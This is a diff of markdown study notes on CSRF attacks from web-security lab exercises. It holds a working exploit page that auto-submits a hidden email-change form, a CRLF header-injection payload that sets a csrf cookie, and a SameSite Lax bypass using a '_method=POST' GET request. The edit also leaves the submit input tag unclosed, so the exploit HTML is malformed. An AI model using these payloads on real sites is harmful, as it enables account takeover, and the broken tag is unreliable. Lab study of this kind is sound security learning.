@@ -109,7 +109,7 @@ csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
     <form action="https://0a8500dc04f529b58343a52300a900b2.web-security-academy.net/my-account/change-email" method="POST">
       <input type="hidden" name="email" value="oops12345&#64;example&#46;com" />
       <input type="hidden" name="csrf" value="random" />
-      <input type="submit" value="Submit request" />
+      <input type="submit" value="Submit request"
     </form>
     <img src="https://0a8500dc04f529b58343a52300a900b2.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=random%3b%20SameSite=None" onerror="document.forms[0].submit();" />
   </body>
@@ -117,4 +117,29 @@ csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
 ```
 
 ## Bypass SameSite Cookie Restriction
+### Same Site vs Same Origin
+Requests are considered same site when the have the same schemes, Top-Level Domain and the additional level of domain.
+
+![image](https://github.com/user-attachments/assets/37f73966-f260-405b-8407-428ff7cab6a4)
+
+Same origins are considered same origin when they have the same schemes, domain names, port numbers 
+
+![image](https://github.com/user-attachments/assets/dc608dc1-bcee-48b1-86bd-005844d5388c)
+
+- Check if the website have SameSite's value set. Otherwise, it is defaulted to be Lax.
+
+### Bypassing SameSite Lax restrictions using GET requests
+PHP Symphony has `_method` that allows us to specify the method sent to the server. A regular POST request can be sent to the server under a form of GET request:
+
+```bash
+https://example.com/my-account/change-email?email=pwned@web-security-academy.net&_method=POST
+```
+
+
+
+
+
+
+
+
 
